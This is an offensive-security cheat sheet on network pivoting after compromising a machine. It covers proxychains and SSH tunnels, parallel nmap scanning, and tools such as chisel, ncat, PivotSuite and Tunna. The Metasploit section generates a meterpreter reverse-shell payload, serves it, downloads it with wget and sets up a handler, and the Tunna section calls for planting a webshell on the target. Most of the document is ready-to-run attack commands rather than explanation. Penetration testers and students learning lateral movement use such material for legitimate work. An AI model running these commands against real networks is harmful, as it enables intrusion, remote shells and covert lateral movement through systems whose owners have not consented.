Pivot Techniques
================

<https://cyberdefense.orange.com/fr/blog/etat-de-lart-du-pivoting-reseau-en-2019/>

### Proxychains Pivot


#  When you have access to a machine, you can use it as pivot to target machines

# Getting known machines
arp -a

# Setup SSH Dynamic on the attacking box
ssh -D <local_port> <user>@<ip>

# Setup proxychains in /etc/proxychains.conf
[ProxyList]
socks4 127.0.0.1 <local_port>

# Reduce timeout in /etc/proxychains.conf to gain speed
tcp_read_time_out 800
tcp_connect_time-out 800

# Then
proxychains...


# Scanning (nmap) can be very long through proxychains
# You can speed it up by using xargs and multithreading
# The main goal is to spread ports between different threads (-P 50)
$ seq 1 65535 | xargs -P 50 -I port proxychains -q nmap -p port -sT -T4 10.42.42.2 -oG 10.42.42.2 --open --append-output 10.42.42.2 -Pn -n

# Take care of some options
# You can't just run -oA but need the --append-output option

# The same behavior can be used to scan multiple machines
# The base command
$ proxychains nmap -p- -sT -T4 --top-ports 20 10.42.42.0/24 -oG 10.42.42.0 --open

# Become
$ seq 1 254 | xargs -P 50 -I cpt proxychains -q nmap --top-ports 20 -sT -T4 10.42.42.cpt -oG 10.42.42.0 --open --append-output 10.42.42.cpt -Pn -n

### Double Pivot Proxychains


# Pivot 1 using proxychains
ssh -D 1080 user@IP_Network1

# Configure /etc/proxychains to set port 1080
# Pivot 2 using proxychains
proxychains ssh -D 1081 user@IP_Network2

# Configure /etc/proxychains to set port 1081

proxychains nmap...

### Port Forwarding


# Windows
plink.exe -l root -R 445:127.0.0.1:445 YOURIPADDRESS

# Metasploit
portfwd add -l 9090 -p 9090 -r TARGETIP 

# Reverse ssh tunnel, port forwarding 8090 from target to us:
ssh -R 8090:localhost:8090 user@ip

# Local port forward, forward local 8090 to target:
ssh -L 8090:localhost:8090 user@ip

### SSH Pivoting


# Local port forwarding
# Local port opened on 127.0.0.1 (bind)
# -N == no command executed (only ssh tunnel)
$ ssh user@pivoting_machine -L [bind_address:]local_port:destination_host:destination_hostport -N

### sshuttle


# Transparent proxy over SSH

# Forwarding traffic through the pivot
# It will then auto create necessary iptables rules
sshuttle -r user@pivoting_machine x.x.x.x/24

# You can also let sshuttle detect networks based on the target
# -x == exclude some network to not transmit over the tunnel
sshuttle -vNr user@pivoting_machine -x x.x.x.x.x/24

### Metasploit pivoting


# Reverse Shell generation
$ msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.2.149 LPORT=8080 -f elf --platform linux --arch x64 > reverse.elf
$ python -m http.server --bind 192.168.2.149
$ wget http://192.168.2.149:8000/reverse.elf
$ chmod u+x reverse.elf

# Setup listener
$ msfconsole -q
msf5 > use exploit/multi/handler
msf5 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
msf5 exploit(multi/handler) > run


# Autoroute module
msf5 > use post/multi/manage/autoroute
msf5 post(multi/manage/autoroute) > set SESSION 1
msf5 post(multi/manage/autoroute) > set CMD add
msf5 post(multi/manage/autoroute) > set SUBNET 10.42.42.0
msf5 post(multi/manage/autoroute) > set NETMASK /24
msf5 post(multi/manage/autoroute) > set CMD print
msf5 post(multi/manage/autoroute) > run

# On windows you can use post/windows/gather/arp_scanner to discover other machines
# On Linux you can try arp -a

# SOCKS proxy setup
msf5 > use auxiliary/server/socks4a
msf5 auxiliary(server/socks4a) > set SRVPORT 1081
msf5 auxiliary(server/socks4a) > run

# Now, equivalent to a dynamic SSH


# Double Pivoting
# Reverse shell from the pwned2 to the pwned1
$ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.42.42.1 LPORT=8088 -f exe --platform windows --arch x64 > reverse.exe

# Setup handler and exploit the found vulnerability

### Ncat pivoting


# Ncat =/= netcat
# Enhanced version, developped by nmap dev and often packaged with
# Ciphered connexion, IP restriction
# To pivot, needed on both attacker and pivot machine

# Attacker (broker == accept multiple connexions)
$ ncat -lv --broker --max-conns 2

# Pivot
# We connect to attacker and target
$ ncat -v 192.168.2.149 31337 -c 'ncat -v 10.42.42.2 80'

### Chisel Pivoting (HTTP Tunnel)


# Chisel offers to encapsulate TCP connexions in HTTP tunnels
# Everything is encrypted using SSH


# Local port forwarding

# Pivot machine
$ chisel server -p 8080 --host 192.168.2.105 -v

# Attacker machine
$ chisel client -v http://192.168.2.105:8080 127.0.0.1:33333:10.42.42.2:80


# Local port forwarding + SOCKS proxy

# Pivot machine
$ chisel server -p 8080 --host 192.168.2.105 --socks5 -v

# Attacker machine
$ chisel client -v http://192.168.2.105:8080 127.0.0.1:33333:socks


# Reverse remote port forwarding

# Attacker machine
$ chisel server -p 8888 --host 192.168.2.149 --reverse -v

# Pivot machine
$ chisel client -v http://192.168.2.149:8888 R:127.0.0.1:44444:10.42.42.2:80

### PivotSuite


# Similar features to other tools but support multilevel pivot
# Like Metasploit

# "Remote" local port forwarding
# On the pivot
$ pivotsuite -S -F --server-option=PF --forward-ip=10.42.42.2 --forward-port=80 --server-ip=192.168.2.105 --server-port=8080

# "Remote" dynamic port forwarding
$ pivotsuite -S -F --server-option=SP --server-ip=192.168.2.105 --server-port=8080

### Tunna / Fulcrom (HTTP) {#tunna--fulcrom-http}


# Everything is through HTTP
# Bypass some IPS/IDS

# First step is to deploy webshell on the target
# Some are available with the tool (but not good)
# Can be hard to use

# Then on the attacker machine
$ python2 proxy.py -u http://192.168.2.105:8080/conn.php -l 7777 -r 80 -a 10.42.42.2 -v

